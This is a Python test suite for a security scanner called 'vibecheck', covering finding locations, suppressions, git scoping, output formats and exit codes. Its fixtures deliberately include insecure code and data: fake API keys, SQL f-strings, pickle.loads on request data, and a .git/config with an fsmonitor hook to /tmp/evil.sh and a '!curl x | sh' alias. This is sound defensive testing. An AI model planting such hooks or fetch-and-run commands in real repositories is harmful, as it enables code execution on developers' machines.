"""Tests for the vibecheck v2 engine: locations, suppressions, scoping, output formats, exit codes."""

import io
import json
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "src"))

from mmu_cli import cli, vibecheck  # noqa: E402
from mmu_cli.vibecheck import engine, output  # noqa: E402

STRIPE_KEY = "sk_live_" + "a1b2c3d4e5" * 3


def write(root: Path, rel: str, content: str) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    engine.reset_caches()
    return path


def run_cli(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with mock.patch.object(sys, "argv", ["mmu", *argv]), redirect_stdout(out), redirect_stderr(err):
        try:
            code = cli.main()
        except SystemExit as exc:  # argparse usage errors
            code = int(exc.code or 0)
    return code, out.getvalue(), err.getvalue()


def git(root: Path, *args: str) -> None:
    subprocess.run(
        ["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@example.com",
         "-c", "commit.gpgsign=false", *args],
        check=True, capture_output=True,
    )


def lines_of(finding) -> list[tuple[str, int | None]]:
    return [(loc.path, loc.line) for loc in finding.locations]


class LocationTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def test_secrets_lines_and_redaction(self):
        p = write(self.root, "src/pay.py", f'import os\n\nKEY = "{STRIPE_KEY}"\nAWS = "AKIAABCDEFGHIJKLMNOP"\n')
        f = vibecheck.check_secrets(self.root, [p])
        self.assertEqual(lines_of(f), [("src/pay.py", 3), ("src/pay.py", 4)])
        self.assertEqual(f.locations[0].snippet, 'KEY = "sk_liv…"')
        self.assertNotIn(STRIPE_KEY, json.dumps(f.to_dict()))
        self.assertNotIn("AKIAABCDEFGHIJKLMNOP", json.dumps(f.to_dict()))

    def test_unignored_env_secret_points_at_its_line(self):
        write(self.root, ".env", f"PORT=3000\nSTRIPE_SECRET_KEY={STRIPE_KEY}\n")
        f = vibecheck.check_secrets(self.root, [])
        self.assertEqual(lines_of(f), [(".env", 2)])
        self.assertNotIn(STRIPE_KEY, json.dumps(f.to_dict()))

    def test_client_bundle_secret_lines_and_redaction(self):
        write(self.root, ".env.local", "A=1\nNEXT_PUBLIC_STRIPE_SECRET_KEY=supersecretvalue1234\n")
        code = write(self.root, "src/app.ts", "const a = 1;\nconst k = process.env.NEXT_PUBLIC_API_SECRET;\n")
        f = vibecheck.check_client_bundle_secrets(self.root, [code])
        self.assertEqual(lines_of(f), [(".env.local", 2), ("src/app.ts", 2)])
        self.assertEqual(f.locations[0].snippet, "NEXT_PUBLIC_STRIPE_SECRET_KEY=supers…")
        self.assertNotIn("supersecretvalue1234", json.dumps(f.to_dict()))

    def test_sql_fstring_lines(self):
        p = write(self.root, "db.py", 'x = 1\nq = f"SELECT * FROM t WHERE id = {x}"\n\nr = f"DELETE FROM t WHERE id = {x}"\n')
        f = vibecheck.check_sql_strings(self.root, [p])
        self.assertEqual(lines_of(f), [("db.py", 2), ("db.py", 4)])
        self.assertIn("SELECT", f.locations[0].snippet)

    def test_unsafe_deserialization_lines(self):
        p = write(self.root, "load.py", "import pickle\nimport yaml\n\na = pickle.loads(request.data)\nc = yaml.load(d)\ne = pickle.load(fh)\n")
        f = vibecheck.check_unsafe_deserialization(self.root, [p])
        self.assertEqual(lines_of(f), [("load.py", 4), ("load.py", 5)])
        blocking, warned = vibecheck.rules.deserialization_findings(self.root, [p])
        self.assertEqual((blocking.status, warned.status), ("fail", "warn"))
        self.assertEqual(lines_of(warned), [("load.py", 6)])

    def test_cors_debug_ssl_lines(self):
        p = write(self.root, "main.py", 'app = FastAPI()\napp.add_middleware(C, allow_origins=["*"])\n\n\nDEBUG = True\nr = get(u, verify=False)\n')
        self.assertEqual(lines_of(vibecheck.check_cors(self.root, [p])), [("main.py", 2)])
        self.assertEqual(lines_of(vibecheck.check_debug_mode(self.root, [p])), [("main.py", 5)])
        self.assertEqual(lines_of(vibecheck.check_disabled_ssl(self.root, [p])), [("main.py", 6)])

    def test_jwt_localstorage_lines(self):
        p = write(self.root, "src/auth.ts", "const t = await login();\n\nlocalStorage.setItem('token', t);\n")
        self.assertEqual(lines_of(vibecheck.check_jwt_localstorage(self.root, [p])), [("src/auth.ts", 3)])

    def test_supabase_rls_points_at_create_table(self):
        write(self.root, "supabase/migrations/1.sql",
              "-- create table commented (id int);\ncreate table a (id int);\nalter table a enable row level security;\n\n/* x\n y */\nCREATE TABLE public.b (\n  id int\n);\n")
        f = vibecheck.check_supabase_rls(self.root, [])
        self.assertEqual(f.status, "fail")
        self.assertEqual(lines_of(f), [("supabase/migrations/1.sql", 7)])
        self.assertIn("CREATE TABLE public.b", f.locations[0].snippet)

    def test_sourcemap_lines(self):
        write(self.root, "vite.config.ts", "export default {\n  build: {\n    sourcemap: true,\n  },\n}\n")
        self.assertEqual(lines_of(vibecheck.check_sourcemaps(self.root, [])), [("vite.config.ts", 3)])

    def test_git_config_lines(self):
        write(self.root, ".git/config", "[core]\n\tbare = false\n\tfsmonitor = /tmp/evil.sh\n[alias]\n\tst = !curl x | sh\n")
        f = vibecheck.check_git_config_exec(self.root, [])
        self.assertEqual(lines_of(f), [(".git/config", 3), (".git/config", 5)])
        self.assertEqual(f.files, [".git/config"])

    def test_webhook_findings_anchor_to_handler_line(self):
        p = write(
            self.root, "app/api/webhooks/stripe/route.ts",
            "import x from 'y';\n\nexport async function POST(req) {\n  const event = await req.json();\n"
            "  if (event.type === 'invoice.paid') await db.insert(grants).values({ user: event.data.object.customer });\n  return ok();\n}\n",
        )
        by_id = {f.check: f for f in vibecheck.check_webhooks(self.root, [p])}
        self.assertEqual(lines_of(by_id["webhook-signature"]), [("app/api/webhooks/stripe/route.ts", 3)])
        self.assertEqual(lines_of(by_id["webhook-idempotency"]), [("app/api/webhooks/stripe/route.ts", 3)])
        self.assertEqual((by_id["webhook-signature"].severity, by_id["webhook-idempotency"].severity), ("P0", "P1"))
        self.assertIn("constructEvent", by_id["webhook-signature"].fix)
        self.assertNotIn("FastAPI", by_id["webhook-signature"].fix)  # only the Next.js variant for a route.ts

    def test_password_reset_anchors_to_login_handler(self):
        p = write(
            self.root, "app/routers/auth.py",
            "from x import LoginIn\n\n@router.post(\"/login\")\ndef login(body):\n    return verify_password(body.password, user.hash)\n",
        )
        f = vibecheck.check_password_reset(self.root, [p])
        self.assertEqual(lines_of(f), [("app/routers/auth.py", 5)])

    def test_rate_limit_and_monitoring_anchor_to_server_entry(self):
        write(self.root, "requirements.txt", "fastapi\n")
        p = write(self.root, "app/main.py", "from fastapi import FastAPI\n\napp = FastAPI()\n")
        self.assertEqual(lines_of(vibecheck.check_rate_limiting(self.root, [p])), [("app/main.py", 3)])
        self.assertEqual(lines_of(vibecheck.check_error_monitoring(self.root, [p])), [("app/main.py", 3)])

    def test_every_active_finding_in_a_full_scan_has_a_location(self):
        write(self.root, "package.json", '{"dependencies": {"next": "15", "@supabase/supabase-js": "2"}}')
        write(self.root, "app/login/page.tsx", "export default function LoginPage() {}\n")
        write(self.root, "app/api/webhooks/route.ts", "export async function POST() {}\n")
        for f in vibecheck.run_vibecheck(self.root):
            if f.status in {"fail", "warn"}:
                self.assertTrue(f.locations, f.check)
                self.assertEqual(sorted(set(f.files)), sorted({loc.path for loc in f.locations}), f.check)


class RegistryTests(unittest.TestCase):
    def test_every_finding_id_is_a_registered_rule_with_metadata(self):
        rules = {r.id: r for r in vibecheck.all_rules()}
        with tempfile.TemporaryDirectory() as tmp:
            for f in vibecheck.run_vibecheck(Path(tmp)):
                self.assertIn(f.check, rules)
        for rule in rules.values():
            self.assertRegex(rule.id, r"^[a-z0-9]+(-[a-z0-9]+)*$")
            self.assertIn(rule.severity, {"P0", "P1"})
            self.assertTrue(rule.title and rule.summary and rule.fix, rule.id)
            self.assertLessEqual(len(rule.fix.splitlines()), 4, rule.id)
            self.assertTrue(rule.ref == "" or rule.ref.startswith("https://"), rule.id)
            self.assertTrue(rule.tags, rule.id)

    def test_list_rules_and_explain(self):
        code, out, _ = run_cli("vibecheck", "--list-rules")
        self.assertEqual(code, 0)
        self.assertIn("webhook-signature", out)
        self.assertIn("supabase-rls", out)
        code, out, _ = run_cli("vibecheck", "--list-rules", "--format", "json")
        self.assertEqual({r["id"] for r in json.loads(out)["rules"]}, set(vibecheck.RULES))
        code, out, _ = run_cli("vibecheck", "--explain", "webhook-signature")
        self.assertEqual(code, 0)
        self.assertIn("constructEvent", out)
        self.assertIn("mmu-ignore[webhook-signature]", out)

    def test_explain_unknown_rule_is_exit_2(self):
        code, out, err = run_cli("vibecheck", "--explain", "nope")
        self.assertEqual(code, 2)
        self.assertIn("unknown rule id", err)
        code, out, _ = run_cli("vibecheck", "--explain", "nope", "--format", "json")
        self.assertEqual(code, 2)
        self.assertEqual(json.loads(out)["error"]["code"], "unknown-rule")


class SuppressionTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def _sql(self) -> dict[str, list]:
        out: dict[str, list] = {}
        for f in vibecheck.run_vibecheck(self.root):
            if f.check == "sql-fstring":
                out.setdefault(f.status, []).append(f)
        return out

    def test_same_line_with_reason_suppresses(self):
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"  # mmu-ignore[sql-fstring]: c comes from a hardcoded allowlist\n')
        found = self._sql()
        self.assertEqual(list(found), ["suppressed"])
        self.assertEqual(found["suppressed"][0].suppress_reason, "c comes from a hardcoded allowlist")
        self.assertEqual(found["suppressed"][0].to_dict()["suppression"],
                         {"reason": "c comes from a hardcoded allowlist", "source": "inline"})

    def test_line_above_and_other_comment_syntaxes(self):
        write(self.root, "db.py", '# mmu-ignore[sql-fstring, debug-mode]: reviewed\nq = f"SELECT * FROM t WHERE id = {c}"\n')
        self.assertEqual(list(self._sql()), ["suppressed"])
        write(self.root, "src/a.ts", "/* mmu-ignore[jwt-localstorage]: demo only */\nlocalStorage.setItem('token', t);\n")
        f = next(f for f in vibecheck.run_vibecheck(self.root) if f.check == "jwt-localstorage")
        self.assertEqual((f.status, f.suppress_reason), ("suppressed", "demo only"))

    def test_without_reason_does_not_suppress(self):
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"  # mmu-ignore[sql-fstring]\n')
        found = self._sql()
        self.assertEqual(list(found), ["fail"])
        self.assertIn("has no reason", found["fail"][0].notes[0])

    def test_wrong_rule_id_or_distant_line_does_not_suppress(self):
        write(self.root, "db.py", '# mmu-ignore[sql-fstring]: too far\n\nq = f"SELECT * FROM t WHERE id = {c}"  # mmu-ignore[secrets]: other rule\n')
        self.assertEqual(list(self._sql()), ["fail"])

    def test_partial_suppression_splits_the_finding(self):
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"  # mmu-ignore[sql-fstring]: allowlisted\nr = f"DELETE FROM t WHERE id = {i}"\n')
        found = self._sql()
        self.assertEqual(lines_of(found["fail"][0]), [("db.py", 2)])
        self.assertEqual(lines_of(found["suppressed"][0]), [("db.py", 1)])

    def test_config_ignore_rule_and_glob(self):
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        write(self.root, "legacy/old/db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        write(self.root, "app.py", "DEBUG = True\n")
        write(self.root, ".mmu/config.toml", '[vibecheck]\nignore = ["debug-mode", "legacy/**:sql-fstring"]\n')
        result = vibecheck.scan(self.root)
        by = {(f.check, f.status): f for f in result.findings}
        self.assertEqual(by[("debug-mode", "suppressed")].suppress_source, "config")
        self.assertEqual(lines_of(by[("sql-fstring", "fail")]), [("db.py", 1)])
        self.assertEqual(lines_of(by[("sql-fstring", "suppressed")]), [("legacy/old/db.py", 1)])
        self.assertEqual(result.summary()["suppressed"], 2)
        self.assertEqual(result.exit_code(), 1)

    def test_fully_suppressed_scan_exits_zero(self):
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        write(self.root, ".mmu/config.toml", '[vibecheck]\nignore = ["**/*.py:sql-fstring", "error-monitoring"]\n')
        result = vibecheck.scan(self.root)
        self.assertEqual(result.summary()["blocking"], 0)
        self.assertEqual(result.exit_code(), 0)

    def test_fallback_toml_parser_reads_ignore_arrays(self):
        data = cli._parse_simple_toml('[vibecheck]\nignore = ["debug-mode", "src/**:secrets"]  # reviewed\n')
        self.assertEqual(data["vibecheck"]["ignore"], ["debug-mode", "src/**:secrets"])


class ScopeTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)
        git(self.root, "init", "-q")
        write(self.root, "old.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        write(self.root, "clean.py", "x = 1\n")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "init")

    def _active(self, scope: str, since: str | None = None) -> dict[str, list]:
        result = vibecheck.scan(self.root, scope=scope, since=since)
        return {f.check: lines_of(f) for f in result.findings if f.status in {"fail", "warn"}}

    def test_changed_covers_modified_and_untracked_only(self):
        self.assertEqual(self._active("changed"), {})
        write(self.root, "clean.py", "DEBUG = True\n")
        write(self.root, "new.py", 'r = f"DELETE FROM t WHERE id = {i}"\n')
        active = self._active("changed")
        self.assertEqual(active, {"sql-fstring": [("new.py", 1)], "debug-mode": [("clean.py", 1)]})
        self.assertIn("old.py", dict(self._active("all")["sql-fstring"]))

    def test_staged_covers_only_the_index(self):
        write(self.root, "clean.py", "DEBUG = True\n")
        write(self.root, "new.py", 'r = f"DELETE FROM t WHERE id = {i}"\n')
        git(self.root, "add", "new.py")
        self.assertEqual(self._active("staged"), {"sql-fstring": [("new.py", 1)]})

    def test_staged_and_changed_before_the_first_commit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            git(root, "init", "-q")
            write(root, "app.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
            write(root, "later.py", "DEBUG = True\n")
            git(root, "add", "app.py")
            staged = {f.check for f in vibecheck.scan(root, scope="staged").findings if f.status == "fail"}
            self.assertEqual(staged, {"sql-fstring"}, "the initial commit must be gated like any other")
            changed = {f.check for f in vibecheck.scan(root, scope="changed").findings if f.status in {"fail", "warn"}}
            self.assertEqual(changed, {"sql-fstring", "debug-mode"})

    def test_since_ref(self):
        write(self.root, "new.py", 'r = f"DELETE FROM t WHERE id = {i}"\n')
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "second")
        self.assertEqual(self._active("since", "HEAD~1"), {"sql-fstring": [("new.py", 1)]})
        self.assertEqual(self._active("changed"), {})
        with self.assertRaises(vibecheck.ScanError) as ctx:
            vibecheck.scan(self.root, scope="since", since="no-such-ref")
        self.assertEqual(ctx.exception.code, "bad-ref")

    def test_cli_scope_flags_and_scope_in_json(self):
        write(self.root, "new.py", 'r = f"DELETE FROM t WHERE id = {i}"\n')
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--changed", "--format", "json")
        doc = json.loads(out)
        self.assertEqual(code, 1)
        self.assertEqual(doc["scope"], {"mode": "changed", "files": 1})
        self.assertEqual([f["rule_id"] for f in doc["findings"]], ["sql-fstring"])
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--staged", "--format", "agent")
        self.assertEqual(code, 0)
        self.assertIn("scope: staged (0 file(s))", out)

    def test_scoped_scan_outside_git_is_exit_2(self):
        with tempfile.TemporaryDirectory() as tmp:
            write(Path(tmp), "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
            env = {"GIT_CEILING_DIRECTORIES": str(Path(tmp).resolve().parent)}
            with mock.patch.dict("os.environ", env):
                code, out, err = run_cli("vibecheck", "--root", tmp, "--changed")
                self.assertEqual(code, 2)
                self.assertEqual(out, "")
                self.assertIn("not a git repository", err)
                code, out, _ = run_cli("vibecheck", "--root", tmp, "--staged", "--json")
                self.assertEqual(code, 2)
                self.assertEqual(json.loads(out)["error"]["code"], "not-a-git-repo")

    def test_missing_git_binary_is_exit_2(self):
        with mock.patch.object(engine.subprocess, "run", side_effect=FileNotFoundError()):
            code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--changed", "--format", "json")
        self.assertEqual(code, 2)
        self.assertEqual(json.loads(out)["error"]["code"], "git-unavailable")


class OutputTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)
        write(self.root, "src/pay.py", f'KEY = "{STRIPE_KEY}"\n')
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"  # mmu-ignore[sql-fstring]: allowlisted column\n')
        write(self.root, "settings.py", "DEBUG = True\n")

    def test_json_v1_document(self):
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "json")
        self.assertEqual(code, 1)
        doc = json.loads(out)
        self.assertEqual(set(doc), {"schema", "tool", "root", "scope", "summary", "findings"})
        self.assertEqual(doc["schema"], "mmu.vibecheck/v1")
        self.assertEqual(doc["tool"]["name"], "mmu")
        self.assertTrue(doc["tool"]["version"])
        self.assertEqual(doc["scope"], {"mode": "all"})
        self.assertEqual(set(doc["summary"]), {"blocking", "warnings", "passed", "skipped", "suppressed", "baselined"})
        self.assertEqual((doc["summary"]["blocking"], doc["summary"]["suppressed"]), (1, 1))
        self.assertEqual({f["status"] for f in doc["findings"]}, {"fail", "warn", "suppressed"})
        for f in doc["findings"]:
            self.assertEqual(
                set(f),
                {"rule_id", "check", "severity", "status", "title", "message", "locations", "files", "fix", "hint",
                 "ref", "confidence", "suppression", "notes", "fingerprint"},
            )
            self.assertRegex(f["fingerprint"], r"^[0-9a-f]{16}$")
            self.assertEqual((f["check"], f["hint"]), (f["rule_id"], f["fix"]))
            for loc in f["locations"]:
                self.assertEqual(set(loc), {"path", "line", "end_line", "snippet"})
        self.assertNotIn(STRIPE_KEY, out)

    def test_json_all_and_alias_flags(self):
        _, out, _ = run_cli("vibecheck", "--root", str(self.root), "--json", "--all")
        statuses = {f["status"] for f in json.loads(out)["findings"]}
        self.assertTrue({"ok", "skip"} <= statuses)
        _, out, _ = run_cli("--json", "vibecheck", "--root", str(self.root))
        self.assertEqual(json.loads(out)["schema"], "mmu.vibecheck/v1")
        _, out, _ = run_cli("--root", str(self.root), "vibecheck", "--json")
        self.assertEqual(json.loads(out)["root"], str(self.root.resolve()))

    def test_agent_format(self):
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "agent")
        self.assertEqual(code, 1)
        lines = out.splitlines()
        self.assertTrue(lines[0].startswith("mmu vibecheck: 1 blocking (P0), "))
        self.assertIn("1 suppressed | scope: all files", lines[0])
        self.assertIn("P0 secrets src/pay.py:1", lines)
        self.assertIn("  silence (only if false positive): # mmu-ignore[secrets]: <reason>", lines)
        self.assertTrue(any(line.startswith("  fix: ") for line in lines))
        self.assertIn("re-run `mmu vibecheck --format agent`", lines[-1])
        self.assertNotIn("sql-fstring", out)  # suppressed findings are only counted
        self.assertNotIn("\x1b[", out)
        self.assertNotIn(STRIPE_KEY, out)
        per_finding = (len(lines) - 2) / (out.count("\nP0 ") + out.count("\nP1 "))
        self.assertLessEqual(per_finding, 5)

    def test_agent_silence_syntax_follows_the_file_type(self):
        def hint(path, line=3):
            return output._silence_hint(vibecheck.Finding("secrets", "P0", "fail", "m", locations=[vibecheck.Location(path, line)]))
        self.assertTrue(hint("a/b.ts").startswith("// mmu-ignore[secrets]"))
        self.assertTrue(hint("a/b.sql").startswith("-- mmu-ignore[secrets]"))
        self.assertTrue(hint(".env.local").startswith("# mmu-ignore[secrets]"))
        self.assertIn('"package.json:secrets"', hint("package.json"))
        self.assertIn('".env:secrets"', hint(".env", None))
        self.assertIn('".git/config:secrets"', hint(".git/config"))

    def test_sarif_structure(self):
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "sarif")
        self.assertEqual(code, 1)
        doc = json.loads(out)
        self.assertEqual(doc["$schema"], "https://json.schemastore.org/sarif-2.1.0.json")
        self.assertEqual(doc["version"], "2.1.0")
        run = doc["runs"][0]
        driver = run["tool"]["driver"]
        self.assertEqual(driver["name"], "mmu-vibecheck")
        self.assertEqual(driver["informationUri"], "https://github.com/minjikim89/make-me-unicorn")
        self.assertTrue(driver["version"])
        rule_ids = [r["id"] for r in driver["rules"]]
        self.assertEqual(set(rule_ids), set(vibecheck.RULES))
        for r in driver["rules"]:
            self.assertTrue(r["shortDescription"]["text"] and r["fullDescription"]["text"] and r["help"]["text"])
            self.assertIn("security", r["properties"]["tags"])
            p0 = r["defaultConfiguration"]["level"] == "error"
            self.assertEqual(r["properties"]["security-severity"], "8.0" if p0 else "5.0")
            if "helpUri" in r:
                self.assertTrue(r["helpUri"].startswith("https://"))
        by_rule = {r["ruleId"]: r for r in run["results"]}
        self.assertEqual(by_rule["secrets"]["level"], "error")
        self.assertEqual(by_rule["debug-mode"]["level"], "warning")
        for r in run["results"]:
            self.assertIn(r["ruleId"], rule_ids)
            self.assertEqual(rule_ids[r["ruleIndex"]], r["ruleId"])
            self.assertTrue(r["message"]["text"])
            self.assertRegex(r["partialFingerprints"]["primaryLocationLineHash"], r"^[0-9a-f]{16}:1$")
            for loc in r.get("locations", []):
                phys = loc["physicalLocation"]
                self.assertNotIn("\\", phys["artifactLocation"]["uri"])
                self.assertFalse(phys["artifactLocation"]["uri"].startswith("/"))
                self.assertGreaterEqual(phys["region"]["startLine"], 1)
        self.assertEqual(by_rule["secrets"]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"], "src/pay.py")
        self.assertEqual(by_rule["sql-fstring"]["suppressions"], [{"kind": "inSource", "justification": "allowlisted column"}])
        self.assertNotIn("suppressions", by_rule["secrets"])
        self.assertNotIn(STRIPE_KEY, out)

    def test_fingerprint_survives_line_shifts_and_matches_json(self):
        def prints():
            _, sarif, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "sarif")
            _, doc, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "json")
            s = {r["ruleId"]: r["partialFingerprints"]["primaryLocationLineHash"] for r in json.loads(sarif)["runs"][0]["results"]}
            j = {f["rule_id"]: f["fingerprint"] for f in json.loads(doc)["findings"]}
            return s, j
        s1, j1 = prints()
        self.assertEqual(s1["secrets"], j1["secrets"] + ":1")
        write(self.root, "src/pay.py", f'import os\n\n\n    KEY  =  "{STRIPE_KEY}"\n')
        s2, j2 = prints()
        self.assertEqual(j1["secrets"], j2["secrets"])
        self.assertEqual(s1["secrets"], s2["secrets"])
        self.assertNotEqual(j1["secrets"], j1["debug-mode"])

    def test_sarif_unknown_line_defaults_to_1(self):
        f = vibecheck.Finding("secrets", "P0", "fail", "m", locations=[vibecheck.Location(".env")])
        doc = output.to_sarif(vibecheck.ScanResult(self.root, [f]))
        self.assertEqual(doc["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["region"]["startLine"], 1)

    def test_text_format_shows_rule_id_path_line_and_fix(self):
        code, out, _ = run_cli("vibecheck", "--root", str(self.root))
        self.assertEqual(code, 1)
        self.assertIn("(P0) secrets:", out)
        self.assertIn("- src/pay.py:1", out)
        self.assertIn("↳ fix: ", out)
        self.assertIn("suppressed: allowlisted column", out)
        self.assertIn("1 launch-blocking issue(s)", out)
        self.assertIn("1 suppressed", out)

    def test_output_file(self):
        target = self.root / "out" / "report.sarif"
        code, out, _ = run_cli("vibecheck", "--root", str(self.root), "--format", "sarif", "--output", str(target))
        self.assertEqual((code, out), (1, ""))
        self.assertEqual(json.loads(target.read_text(encoding="utf-8"))["version"], "2.1.0")


class ExitCodeTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

    def test_0_clean_1_blocking(self):
        write(self.root, "lib.py", "def add(a, b): return a + b\n")
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root))[0], 0)
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root))[0], 1)

    def test_fail_on(self):
        write(self.root, "settings.py", "DEBUG = True\n")  # P1 only
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root))[0], 0)
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root), "--fail-on", "P1")[0], 1)
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root), "--fail-on", "p1")[0], 1)
        write(self.root, "db.py", 'q = f"SELECT * FROM t WHERE id = {c}"\n')
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root), "--fail-on", "never")[0], 0)
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root), "--fail-on", "bogus")[0], 2)

    def test_bad_root_is_exit_2_with_json_error_object(self):
        missing = str(self.root / "nope")
        code, out, err = run_cli("vibecheck", "--root", missing)
        self.assertEqual((code, out), (2, ""))
        self.assertIn("is not a directory", err)
        code, out, _ = run_cli("vibecheck", "--root", missing, "--format", "json")
        self.assertEqual(code, 2)
        doc = json.loads(out)
        self.assertEqual(set(doc), {"schema", "error"})
        self.assertEqual(doc["schema"], "mmu.vibecheck/v1")
        self.assertEqual(doc["error"]["code"], "bad-root")
        self.assertIn("is not a directory", doc["error"]["message"])

    def test_scope_flags_are_mutually_exclusive(self):
        self.assertEqual(run_cli("vibecheck", "--root", str(self.root), "--changed", "--staged")[0], 2)


if __name__ == "__main__":
    unittest.main()
